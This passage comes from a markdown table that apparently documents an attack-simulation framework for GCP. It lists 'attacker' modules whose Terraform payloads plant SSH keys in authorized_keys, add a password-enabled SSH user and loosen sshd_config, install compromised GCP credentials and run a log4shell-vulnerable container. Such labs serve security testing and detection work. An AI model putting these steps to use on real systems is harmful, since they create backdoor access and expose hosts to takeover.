&quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;entrypoint&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;entrypoint&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| attacker-ssh-keys                                       | ./modules/osconfig/deploy-ssh-keys                    | osconfig_deploy_secret_ssh_public               | context.gcp.osconfig.ssh_keys                                    | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "ssh_keys": {<br/>                    "enabled": false,<br/>                    "ssh_authorized_keys_path": "/home/sshuser/.ssh/authorized_keys",<br/>                    "ssh_private_key_path": "/home/sshuser/.ssh/secret_key",<br/>                    "ssh_public_key_path": "/home/sshuser/.ssh/secret_key.pub"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                    | <pre>&#35; ssh key<br/>resource &quot;tls&&#35;95;private&&#35;95;key&quot; &quot;ssh&quot; &&#35;123;<br/>  algorithm = &quot;RSA&quot;<br/>  rsa&&#35;95;bits  = &quot;4096&quot;<br/>&&#35;125;<br/><br/>locals &&#35;123;<br/>    ssh&&#35;95;private&&#35;95;key = base64encode&&#35;40;tls&&#35;95;private&&#35;95;key&#46;ssh&#46;private&&#35;95;key&&#35;95;pem&&#35;41;<br/>    ssh&&#35;95;private&&#35;95;key&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;private&&#35;95;key&&#35;95;path&quot;&&#35;93;<br/>    ssh&&#35;95;public&&#35;95;key = base64encode&&#35;40;chomp&&#35;40;tls&&#35;95;private&&#35;95;key&#46;ssh&#46;public&&#35;95;key&&#35;95;openssh&&#35;41;&&#35;41;<br/>    ssh&&#35;95;public&&#35;95;key&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;public&&#35;95;key&&#35;95;path&quot;&&#35;93;<br/>    ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&quot;&&#35;93;<br/>    public&&#35;95;key&&#35;95;user = split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;1&&#35;93; == &quot;root&quot; ? &quot;root&quot; : split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;2&&#35;93;<br/>    private&&#35;95;key&&#35;95;user = split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;1&&#35;93; == &quot;root&quot; ? &quot;root&quot; : split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;2&&#35;93;<br/><br/>    payload&&#35;95;public = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;&quot;<br/>    log &quot;adding user: $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;&#46;&#46;&#46;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;&quot; &#124;&#124; log &quot;$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; user already exists&quot;<br/>    mkdir &#45;p $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    chown &#45;R $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt;&gt; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    sort $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125; &#124; uniq &gt; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&#46;uniq<br/>    mv $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&#46;uniq $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    chmod 600 $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    chown &#45;R $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    log &quot;public key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;authorized key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload&&#35;95;public = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;public&&#35;95;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload&&#35;95;public<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    payload&&#35;95;private = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;&quot;<br/>    log &quot;adding user: $&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;&#46;&#46;&#46;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;&quot; &#124;&#124; log &quot;$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125; user already exists&quot;<br/>    mkdir &#45;p $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    chmod 600 $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    chown $&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    log &quot;private key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload&&#35;95;private = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;private&&#35;95;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload&&#35;95;private<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload&&#35;95;public = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;public&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;public = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;public&&#35;41;<br/>        base64&&#35;95;payload&&#35;95;private = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;private&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;private = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;private&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| attacker-ssh-user                                       | ./modules/osconfig/deploy-ssh-user                    | osconfig_deploy_ssh_user                        | context.gcp.osconfig.ssh_user                                    | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "ssh_user": {<br/>                    "enabled": false,<br/>                    "password": null,<br/>                    "username": "lou.caloozer"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                    | <pre>locals &&#35;123;<br/>    password = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;password&quot;&&#35;93;&&#35;41;,&quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;password&quot;&&#35;93; :  random&&#35;95;password&#46;password&#46;result<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125; &#124;&#124; log &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125; user already exists&quot;<br/>    log &quot;Setting passwd: $&&#35;123;local&#46;password&&#35;125;&quot;<br/>    echo &&#35;x27;$&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;:$&&#35;123;local&#46;password&&#35;125;&&#35;x27; &#124; chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd&&#35;95;config&#46;d&quot;<br/>    cat &gt; /etc/ssh/sshd&&#35;95;config&#46;d/common&#45;user&#45;passwd&#45;auth&#46;conf &lt;&lt;&#45;EOF <br/>    &#35; Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2&#45;user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &&#35;x27;We talked about this guys&#46; No SSH for you&#33;&&#35;x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd&&#35;95;config&#46;d/custom&#45;user&#45;passwd&#45;auth&#46;conf &lt;&lt;&#45;EOF <br/>    Match User $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>        password = local&#46;password<br/>    &&#35;125;<br/>&&#35;125;<br/><br/>resource &quot;random&&#35;95;password&quot; &quot;password&quot; &&#35;123;<br/>  length           = 16<br/>  special          = true<br/>  override&&#35;95;special = &quot;&#33;&#35;$%&amp;&&#35;42;&&#35;40;&&#35;41;&#45;&&#35;95;=&#43;&&#35;91;&&#35;93;&&#35;123;&&#35;125;&lt;&gt;:?&quot;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| attacker-gcp-credentials                                | ./modules/osconfig/deploy-gcp-credentials             | osconfig_deploy_secret_gcp_credentials          | context.gcp.osconfig.gcp_credentials                             | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "gcp_credentials": {<br/>                    "compromised_keys_user": null,<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-gcp-credentials             | <pre>locals &&#35;123;<br/>    tool = &quot;gcloud&quot;<br/>    gcp&&#35;95;creds = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;&&#35;91;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;&&#35;93;&#46;rendered<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Deploying gcp credentials&#46;&#46;&#46;&quot;<br/>    mkdir &#45;p ~/&#46;config/gcloud<br/>    if &&#35;91;  &quot;$&&#35;123; local&#46;gcp&&#35;95;creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; &&#35;125;&quot; == &quot;true&quot; &&#35;93;; then<br/>      echo $&&#35;123;base64gzip&&#35;40;local&#46;gcp&&#35;95;creds&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; ~/&#46;config/gcloud/credentials&#46;json<br/>      gcloud auth activate&#45;service&#45;account &#45;&#45;key&#45;file=~/&#46;config/gcloud/credentials&#46;json<br/>    fi<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found &#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found &#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| attacker-vulnerable-docker-log4j-app                    | ./modules/osconfig/deploy-docker-log4j-app            | osconfig_deploy_docker_log4j_app                | context.gcp.osconfig.vulnerable.docker.log4j_app                 | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "docker": {<br/>                        "log4j_app": {<br/>                            "enabled": false,<br/>                            "listen_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app            | <pre>locals &&#35;123;<br/>    image = &quot;ghcr&#46;io/christophetd/log4shell&#45;vulnerable&#45;app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        if &&#35;91;&&#35;91; &&#35;96;sudo docker ps &#124; grep $&&#35;123;local&#46;name&&#35;125;&&#35;96; &&#35;93;&&#35;93;; then docker stop $&&#35;123;local&#46;name&&#35;125;; fi<br/>        log &quot;$&&#35;40;echo &&#35;x27;docker run &#45;d &#45;&#45;name $&&#35;123;local&#46;name&&#35;125; &#45;v /tmp:/tmp &#45;&#45;rm &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;:8080 $&&#35;123;local&#46;image&&#35;125;&&#35;x27;&&#35;41;&quot;<br/>        docker run &#45;d &#45;&#45;name $&&#35;123;local&#46;name&&#35;125; &#45;v /tmp:/tmp &#45;&#45;rm &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;:8080 $&&#35;123;local&#46;image&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps &#45;a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         